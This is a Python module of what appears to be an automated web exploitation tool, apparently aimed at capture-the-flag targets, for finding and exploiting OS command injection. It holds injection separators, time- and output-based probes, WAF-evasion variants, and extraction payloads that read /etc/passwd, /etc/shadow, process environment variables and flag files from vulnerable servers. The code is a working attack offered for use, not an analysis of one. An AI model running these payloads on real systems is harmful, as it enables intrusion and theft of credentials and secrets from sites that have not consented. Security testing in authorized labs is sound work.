"""
EnoughOfWeb — Command Injection Module
Separators: ;  |  ||  &  &&  $()  backtick  newline
Detection: time-based (sleep), output-based (unique marker).
"""

import re
import time
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ---------------------------------------------------------------------------
# Separators and detection payloads
# ---------------------------------------------------------------------------

SEPARATORS = [
    ";",
    "|",
    "||",
    "&",
    "&&",
    "\n",
    "\r\n",
    "`{cmd}`",
    "$({cmd})",
]

TIME_DETECT_CMDS = [
    "sleep 5",
    "sleep 5 #",
    "ping -c 5 127.0.0.1",
]

# Unique marker for output-based detection
MARKER = "eow7x8k9m2q"

OUTPUT_DETECT_CMDS = [
    f"echo {MARKER}",
    f"echo {MARKER} #",
    f"/bin/echo {MARKER}",
]

# Commands for data extraction
EXTRACT_COMMANDS = [
    "cat /flag*",
    "cat /flag.txt",
    "cat /flag",
    "cat /home/*/flag*",
    "cat /app/flag*",
    "cat /var/www/flag*",
    "cat /opt/flag*",
    "cat /tmp/flag*",
    "find / -name 'flag*' -type f 2>/dev/null | head -10",
    "find / -name 'secret*' -type f 2>/dev/null | head -10",
    "env",
    "printenv",
    "printenv FLAG",
    "echo $FLAG",
    "cat /etc/passwd",
    "ls -la /",
    "ls -la /home/",
    "ls -la /app/",
    "id",
    "whoami",
    "cat /proc/self/environ",
    "strings /proc/self/environ",
    "cat /etc/shadow",
]

# Encoding/evasion variants
EVASION_SEPARATORS = [
    "%0a",  # URL-encoded newline
    "%0d%0a",  # CRLF
    "%3b",  # URL-encoded ;
    "%7c",  # URL-encoded |
    "%26",  # URL-encoded &
]

EVASION_COMMANDS = [
    "c'a't /flag*",
    "ca\"t\" /flag*",
    "c\\at /flag*",
    "/bin/cat /flag*",
    "cat${IFS}/flag*",
    "cat$IFS/flag*",
    "{cat,/flag*}",
    "$(cat /flag*)",
    "tail /flag*",
    "head /flag*",
    "more /flag*",
    "less /flag*",
    "tac /flag*",
    "rev /flag* | rev",
    "sort /flag*",
    "xxd /flag* | xxd -r",
    "base64 /flag* | base64 -d",
]


class CMDiExploit(BaseExploit):
    name = "cmdi"
    description = "OS Command Injection — separators, time-based, output-based"
    priority = 3

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []
        injection_points = self._gather_injection_points(target_url, recon_data)

        for point in injection_points:
            url = point["url"]
            param = point["param"]
            method = point["method"]
            base_data = point.get("base_data", {})

            # 1. Output-based detection (faster)
            finding = self._detect_output_based(url, param, method, base_data)
            if finding:
                findings.append(finding)
                continue

            # 2. Time-based detection
            finding = self._detect_time_based(url, param, method, base_data)
            if finding:
                findings.append(finding)

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            return self._exploit_cmdi(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _gather_injection_points(self, target_url, recon_data):
        points = []
        seen = set()

        for p in recon_data.get("parameters", []):
            key = (p.get("url", target_url), p["name"])
            if key in seen:
                continue
            seen.add(key)
            method = "GET" if p.get("location", "url") == "url" else "POST"
            points.append({
                "url": p.get("url", target_url),
                "param": p["name"],
                "method": method,
                "base_data": {},
            })

        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            inputs = form.get("inputs", {})
            for input_name in inputs:
                key = (form_url, input_name)
                if key in seen:
                    continue
                seen.add(key)
                points.append({
                    "url": form_url,
                    "param": input_name,
                    "method": method,
                    "base_data": dict(inputs),
                })

        if not points:
            for p in ["ip", "host", "cmd", "command", "exec", "ping",
                       "domain", "url", "target", "filename", "path"]:
                points.append({"url": target_url, "param": p, "method": "GET", "base_data": {}})

        return points

    def _send_payload(self, url, param, method, payload, base_data=None, timeout=None):
        data = dict(base_data) if base_data else {}
        kwargs = {}
        if timeout:
            kwargs["timeout"] = timeout
            
        def _do_send(p: str):
            try:
                if method == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [p]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    return self._request("GET", test_url, **kwargs)
                else:
                    req_data = dict(data)
                    req_data[param] = p
                    return self._request("POST", url, data=req_data, **kwargs)
            except Exception:
                return None

        resp, used_payload, was_mutated = self._send_with_waf_retry(
            send_fn=_do_send,
            payload=payload,
            context="cmdi",
            target_url=url
        )
        return resp

    def _build_injection(self, separator: str, cmd: str, prefix: str = "1") -> str:
        """Build an injection payload with the given separator and command."""
        if "{cmd}" in separator:
            return prefix + separator.format(cmd=cmd)
        return f"{prefix}{separator}{cmd}"

    def _detect_output_based(self, url, param, method, base_data) -> Optional[Finding]:
        for sep in SEPARATORS:
            for cmd in OUTPUT_DETECT_CMDS:
                payload = self._build_injection(sep, cmd)
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp and MARKER in resp.text:
                    return Finding(
                        module=self.name,
                        vuln_type="command-injection-output",
                        target_url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence=f"Marker '{MARKER}' found in response",
                        severity=Severity.CRITICAL,
                        extra={
                            "separator": sep,
                            "base_data": base_data,
                            "detection": "output",
                        },
                    )

        # Try URL-encoded evasion separators
        for sep in EVASION_SEPARATORS:
            for cmd in OUTPUT_DETECT_CMDS:
                payload = f"1{sep}{cmd}"
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp and MARKER in resp.text:
                    return Finding(
                        module=self.name,
                        vuln_type="command-injection-output",
                        target_url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence=f"Marker '{MARKER}' found (evasion separator: {sep})",
                        severity=Severity.CRITICAL,
                        extra={
                            "separator": sep,
                            "base_data": base_data,
                            "detection": "output-evasion",
                        },
                    )

        return None

    def _detect_time_based(self, url, param, method, base_data) -> Optional[Finding]:
        # Measure baseline
        start = time.time()
        self._send_payload(url, param, method, "1", base_data, timeout=15)
        baseline = time.time() - start
        threshold = baseline + 4

        for sep in SEPARATORS:
            for cmd in TIME_DETECT_CMDS:
                payload = self._build_injection(sep, cmd)
                start = time.time()
                try:
                    self._send_payload(url, param, method, payload, base_data, timeout=15)
                except Exception:
                    pass
                elapsed = time.time() - start

                if elapsed >= threshold:
                    return Finding(
                        module=self.name,
                        vuln_type="command-injection-time",
                        target_url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence=f"Response time {elapsed:.2f}s vs baseline {baseline:.2f}s",
                        severity=Severity.CRITICAL,
                        extra={
                            "separator": sep,
                            "base_data": base_data,
                            "detection": "time",
                            "elapsed": elapsed,
                            "baseline": baseline,
                        },
                    )

        return None

    def _exploit_cmdi(self, finding: Finding) -> ExploitResult:
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        separator = finding.extra.get("separator", ";")
        all_data = []

        # Build command list: standard + evasion
        commands = list(EXTRACT_COMMANDS)
        if finding.extra.get("detection") == "output-evasion":
            commands = EVASION_COMMANDS + commands

        for cmd in commands:
            payload = self._build_injection(separator, cmd)
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue

            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True, flag=flag, payload_used=payload,
                    technique="command-injection",
                    raw_response=resp.text[:2000],
                )

            # Check for meaningful output
            output = self._extract_cmd_output(resp.text, MARKER)
            if output and len(output.strip()) > 3:
                all_data.append(f"[{cmd}]:\n{output[:1000]}")

        # If standard separators failed with standard commands, try evasion commands
        if not all_data:
            for cmd in EVASION_COMMANDS:
                payload = self._build_injection(separator, cmd)
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=payload,
                        technique="command-injection-evasion",
                        raw_response=resp.text[:2000],
                    )

        if all_data:
            combined = "\n---\n".join(all_data)
            flag = self._check_flag(combined)
            return ExploitResult(
                success=True, flag=flag, data_extracted=combined,
                technique="command-injection",
            )

        return ExploitResult(success=False, error="Command injection exploitation failed")

    def _extract_cmd_output(self, response_text: str, marker: str = None) -> Optional[str]:
        """Try to extract command output from the response."""
        # Remove common HTML
        clean = re.sub(r"<[^>]+>", "\n", response_text)
        clean = re.sub(r"\n{3,}", "\n\n", clean).strip()

        # Check for /etc/passwd
        if "root:" in clean and "/bin/" in clean:
            passwd_match = re.search(r"(root:.*?(?:/bin/\w+|/sbin/nologin))", clean, re.DOTALL)
            if passwd_match:
                return passwd_match.group(0)

        # Check for env vars
        env_match = re.findall(r"^[A-Z_]+=.+$", clean, re.MULTILINE)
        if env_match:
            return "\n".join(env_match[:20])

        return clean if len(clean) > 10 else None
